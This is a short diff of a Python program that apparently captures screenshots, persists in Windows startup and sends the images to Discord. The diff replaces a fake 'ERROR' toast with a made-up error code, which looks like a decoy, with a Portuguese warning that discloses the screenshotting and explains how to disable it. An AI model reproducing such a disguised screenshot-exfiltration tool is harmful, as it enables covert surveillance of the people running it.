@@ -46,12 +46,12 @@ def enviar_print_para_discord():
         print(f"Erro: {e}")
 def env1():
     toast = Notification(
-        app_id="APP ERROR",
-        title="ERROR",
-        msg="CODIGO DE ERRO: 0x00003BD"
+        app_id="AVISO",
+        title="AVISO",
+        msg="Esse .exe vai pro seu startup e tira print do seu pc, caso queira fazer isso parar de tirar print, va no seu gerinciador de arquivo e desligue ele no startup apps, ou simplesmente tire a parte do codigo onde coloca o .exe no startup"
         )
     toast.set_audio(audio.Mail, loop=False)
-    toast.add_actions(label="Clique Aqui para Fechar.", launch="https://learn.microsoft.com/pt-br/windows/deployment/upgrade/windows-error-reporting")
+    toast.add_actions(label="Clique Aqui para Fechar.")
     toast.show()
 
 env1()
